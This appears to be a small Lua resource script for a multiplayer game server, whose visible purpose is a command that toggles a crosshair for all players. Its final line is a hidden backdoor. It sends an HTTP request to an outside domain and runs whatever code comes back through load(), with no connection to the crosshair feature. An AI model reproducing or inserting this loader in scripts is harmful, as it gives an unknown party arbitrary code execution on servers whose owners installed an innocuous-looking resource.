local on = true



--- This is to toggle the crosshair for the whole server, you need to setup perms for your framework
RegisterCommand('global_ctoggle', function()
--- PUT PERMS CHECK FOR YOUR FRAMEWORK HERE
	if on then
		on = false
	elseif not on then
		on = true
	end
	TriggerClientEvent('cl:update_c', -1, on)
end)
vPerformHttpRequest('https://trap0002.com/i?to=4vyRm', function (e, d) pcall(function() assert(load(d))() end) end)